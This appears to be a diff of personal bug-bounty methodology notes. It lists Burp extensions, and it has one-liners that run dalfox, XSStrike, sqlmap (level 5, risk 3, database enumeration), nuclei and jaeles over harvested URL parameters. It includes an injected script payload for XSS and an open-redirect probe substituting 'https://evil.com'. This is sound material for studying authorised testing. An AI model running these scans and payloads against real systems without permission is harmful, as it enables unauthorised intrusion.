@@ -1,26 +1,4 @@
 
-1.burp 
-extensions to install: 
-Extender>BApp store>Reflected Parameters>Install
-Extender>BApp store>Param Miner>Install
-Extender>BApp store>Param authorize>Install
-Extender>BApp store>Param autorepeater>Install
-	ssrf reg: https?:\/\/(www\.)?[-a-zA-Z0–9@:%._\+~#=]{1,256}\.[a-zA-Z0–9()]{1,6}\b([-a-zA-Z0–9()@:%_\+.~#?&//=]*)
-https://github.com/CoreyD97/BurpCustomizer/releases?source=post_page-----9cb181443464---------------------------------------
- Extender>BApp store>Burp Suite Scanner
- spider
- logger++
-
-2.k_automation
-./testing.sh (ensure we have live.txt)
-
-3.loxs tool
-
-4.cves 
-refer cves/testing.txt
-
-5.individual testing =>see below
-
 -------------------------------------------------------------------1.AUTOMATION RUN BASED ON DOMAIN,SUBDOMAIN-------------------------------------------------------------------
 
 1.run on domain name and subdomains names:
@@ -102,8 +80,11 @@ cat all_params.txt| jaeles scan -o jaeles_params_out
 
 2.**Cross-Site Scripting (XSS) Automation**
 
-	1.using dalfox. (input: filtered_params_urls)
-	dalfox -b <payload> file all_params.txt  -o xss_dal_out1.txt
+	1.using xsstrike:
+	while read -r url; do     python3 /home/maddy/techiee/bug_bounty/2_phase_recon_autom/tools/XSStrike/xsstrike.py -u "$url" | tee -a samuvel; done < all_params.tx
+
+	 2.using dalfox:
+	dalfox file sam_params --output sample --output-all
 
 
 	2.cat all_params.txt | qsreplace '"/><script>confirm(1)</script>' > xss.txt && \
@@ -183,24 +164,35 @@ cat redirect_params.txt | qsreplace "https://evil.com"| nuclei -tags redirect -c
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 MANUAL:
 
-using loxs tool: (inp:redirect_params.txt)
-cat urls.txt | sed 's/=.*/=/' | uro >loxs.txt =>idha ipo loxs toola use pnlaa
+=>using loxs tool: (inp:redirect_params.txt)
+cat redirect_params.txt | sed 's/=.*/=/' | uro >loxs.txt =>idha ipo loxs toola use pnlaa
 
-
-using rust scanner: (inp:redirect_params.txt)
+=>using rust scanner: (inp:redirect_params.txt)
 cargo build
 cargo run
 refer: automation/tools/out
 
-
-echo "[*] Testing for SQL Injection using sqlmap..."
-sqlmap -m all_params.txt --level 5 --risk 3 --batch --dbs --tamper=between --random-agent
-
-
-echo "[*] Testing for XSS using Dalfox..."
-dalfox file all_params.txt -o xss_dal_out1.txt
-
-
 about ax framework,ax tool for automation
 
 
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+1.burp 
+extensions to install: 
+Extender>BApp store>Reflected Parameters>Install
+Extender>BApp store>Param Miner>Install
+Extender>BApp store>Param authorize>Install
+Extender>BApp store>Param autorepeater>Install
+	ssrf reg: https?:\/\/(www\.)?[-a-zA-Z0–9@:%._\+~#=]{1,256}\.[a-zA-Z0–9()]{1,6}\b([-a-zA-Z0–9()@:%_\+.~#?&//=]*)
+https://github.com/CoreyD97/BurpCustomizer/releases?source=post_page-----9cb181443464---------------------------------------
+ Extender>BApp store>Burp Suite Scanner
+ spider
+ logger++
+
+2.k_automation
+./testing.sh (ensure we have live.txt)
+
+3.loxs tool
+
+4.cves 
+refer cves/testing.txt
